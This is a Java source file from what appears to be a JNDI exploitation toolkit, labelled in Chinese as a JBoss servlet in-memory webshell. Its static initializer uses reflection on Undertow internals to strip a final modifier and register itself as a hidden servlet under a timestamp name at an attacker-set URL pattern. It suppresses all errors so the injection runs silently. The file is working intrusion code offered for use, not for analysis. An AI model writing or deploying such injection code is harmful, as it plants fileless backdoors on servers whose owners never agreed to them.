package com.qi4l.jndi.template.jboss;


import io.undertow.servlet.api.DeploymentInfo;
import io.undertow.servlet.api.ServletInfo;
import io.undertow.servlet.core.DeploymentImpl;
import io.undertow.servlet.handlers.ServletHandler;
import io.undertow.servlet.spec.HttpServletRequestImpl;
import io.undertow.servlet.spec.ServletRegistrationImpl;
import io.undertow.servlet.util.ConstructorInstanceFactory;


import javax.security.jacc.PolicyContext;
import javax.servlet.*;
import java.lang.reflect.Field;

import java.lang.reflect.Modifier;
import java.util.Map;

import static org.fusesource.jansi.Ansi.ansi;


/**
 * jboss Servlet 内存马
 * @author nu1r
 */
public class JBSMSFromContextS implements Servlet {

    public static String pattern;

    static {
        try {
            String servletName = String.valueOf(System.nanoTime());

            HttpServletRequestImpl request = (HttpServletRequestImpl) PolicyContext.getContext("javax.servlet.http.HttpServletRequest");
            ServletContext         context = request.getServletContext();
            Field                  f       = context.getClass().getDeclaredField("deploymentInfo");
            f.setAccessible(true);
            DeploymentInfo deploymentInfo = (DeploymentInfo) f.get(context);

            //只添加一次
            Map<String, ServletInfo> servlets = deploymentInfo.getServlets();
            if (!servlets.containsKey(servletName)) {

                Class       clazz       = JBSMSFromContextS.class;
                ServletInfo servletInfo = new ServletInfo(servletName, clazz, new ConstructorInstanceFactory<Servlet>(clazz.getDeclaredConstructor()));
                deploymentInfo.addServlet(servletInfo);

                f = context.getClass().getDeclaredField("deployment");
                f.setAccessible(true);
                Field modifiersField = Field.class.getDeclaredField("modifiers");
                modifiersField.setAccessible(true);
                modifiersField.setInt(f, f.getModifiers() & ~Modifier.FINAL);
                DeploymentImpl deployment = (DeploymentImpl) f.get(context);
                ServletHandler handler    = deployment.getServlets().addServlet(servletInfo);

                ServletRegistrationImpl registration = new ServletRegistrationImpl(servletInfo, handler.getManagedServlet(), deployment);
                registration.addMapping(pattern);
            }
        } catch (Exception ignored) {
        }
    }

    @Override
    public void init(ServletConfig servletConfig) throws ServletException {
    }

    @Override
    public ServletConfig getServletConfig() {
        return null;
    }

    @Override
    public void service(ServletRequest servletRequest, ServletResponse servletResponse) {
    }

    @Override
    public String getServletInfo() {
        return null;
    }

    @Override
    public void destroy() {
    }
}
